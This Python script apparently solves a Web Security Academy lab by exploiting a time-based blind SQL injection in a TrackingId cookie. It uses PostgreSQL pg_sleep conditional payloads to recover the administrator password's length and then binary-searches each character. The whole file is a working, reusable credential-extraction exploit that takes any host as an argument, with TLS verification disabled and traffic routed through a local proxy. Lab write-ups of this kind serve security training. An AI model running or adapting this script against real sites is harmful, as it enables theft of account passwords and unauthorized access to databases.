import sys;import requests;import urllib;import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
#host = "https://ac891fc11e900c7cc0ae11d900af004c.web-security-academy.net/"

def checkThisChr(index, encChr, host):
    enc_payload = urllib.parse.quote(("vDebp5jhHxKOeRBn' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, %d, 1) > '%s') THEN ('a'||pg_sleep(2)) ELSE 'a' END FROM users)='a' --" %(index, chr(encChr))))
    cookies = {'TrackingId': enc_payload, 'session': "GQ4A0MDxqF3Hei26K88LlCbc1VsfjSZE"}
    response = requests.get(host, cookies=cookies, verify=False, proxies=proxies)
    #sys.stdout.write('\r' + password + chr(encChr))
    #sys.stdout.flush()
    if response.elapsed.total_seconds() >= 2:
        return True
    else:
        return False

def findCrctChr(index, host):
    list = range(48, 123)
    e = len(list) - 1
    s = 0
    while e > s:
        mid = s + int((e - s)/2)
        isGrtr = checkThisChr(index, list[mid], host)
        if isGrtr:
            s = mid + 1
        else:
            e = mid
    return chr(list[s])

def get_password(host, pass_len):
    password=""
    print("getting the password....")
    for i in range(1, pass_len + 1):
        password+=findCrctChr(i, host)
    return password

def get_password_length(host):
    payload="vDebp5jhHxKOeRBn' AND (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password)=%d) THEN ('a'||pg_sleep(2)) ELSE 'a' END FROM users)='a' --"
    pass_len=1
    while True:
        print(pass_len)
        cookies={'TrackingId': urllib.parse.quote((payload %(pass_len))), 'session': "GQ4A0MDxqF3Hei26K88LlCbc1VsfjSZE"} 
        response = requests.get(host, cookies=cookies, verify=False, proxies=proxies)
        if int(response.elapsed.total_seconds()) >= 2:
            print("adminstrator password length = %d" %(pass_len))
            break
        pass_len+=1
    return pass_len


def main ():
    if len(sys.argv) < 2:
        print("(+) usage: python3 script.py <host_name>")
        return 

    host = sys.argv[1]
    pass_len = get_password_length(host)
    
    password = get_password(host, pass_len)

    print("administrator password = %s" %(password))

if __name__ == "__main__":
    main()
